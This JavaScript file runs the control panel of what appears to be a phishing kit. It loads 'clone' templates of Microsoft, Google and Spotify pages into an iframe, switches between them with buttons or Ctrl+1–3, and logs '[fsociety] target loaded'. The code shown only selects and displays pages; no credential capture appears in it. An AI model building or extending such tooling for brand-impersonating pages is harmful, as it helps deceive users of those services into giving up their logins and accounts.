document.addEventListener('DOMContentLoaded', () => {
    const templateBtns = document.querySelectorAll('.template-btn');
    const templateFrame = document.getElementById('template-frame');
    const currentTemplateLabel = document.getElementById('current-template');
    const toggleBtn = document.getElementById('toggle-selector');
    const selector = document.getElementById('template-selector');

    // Template URLs
    const templates = {
        microsoft: '/cadastro/templates/microsoft/index.html',
        google: '/cadastro/templates/google/index.html',
        spotify: '/cadastro/templates/spotify/index.html'
    };

    // Template names
    const templateNames = {
        microsoft: 'microsoft_clone',
        google: 'google_clone',
        spotify: 'spotify_clone'
    };

    // Load template
    function loadTemplate(templateId) {
        const url = templates[templateId];
        if (!url) return;

        // Update UI
        templateBtns.forEach(btn => {
            btn.classList.toggle('active', btn.dataset.template === templateId);
        });

        currentTemplateLabel.textContent = templateNames[templateId];

        // Load iframe
        templateFrame.src = url;

        // Save to localStorage
        localStorage.setItem('selectedTemplate', templateId);

        console.log(`[fsociety] target loaded: ${templateId}`);
    }

    // Click handlers
    templateBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            loadTemplate(btn.dataset.template);
        });
    });

    // Toggle selector bar
    toggleBtn.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        selector.classList.toggle('minimized');
        console.log('[fsociety] panel:', selector.classList.contains('minimized') ? 'hidden' : 'visible');
    });

    // Sempre inicia com um template (Microsoft por padrao, ou o salvo)
    const savedTemplate = localStorage.getItem('selectedTemplate');
    const defaultTemplate = 'microsoft';
    loadTemplate(savedTemplate && templates[savedTemplate] ? savedTemplate : defaultTemplate);

    // Keyboard shortcuts
    document.addEventListener('keydown', (e) => {
        // Ctrl+1, 2, 3 to switch templates
        if (e.ctrlKey && e.key >= '1' && e.key <= '3') {
            e.preventDefault();
            const index = parseInt(e.key) - 1;
            const templateIds = Object.keys(templates);
            if (templateIds[index]) {
                loadTemplate(templateIds[index]);
            }
        }

        // Escape to toggle selector
        if (e.key === 'Escape') {
            selector.classList.toggle('minimized');
        }
    });
});
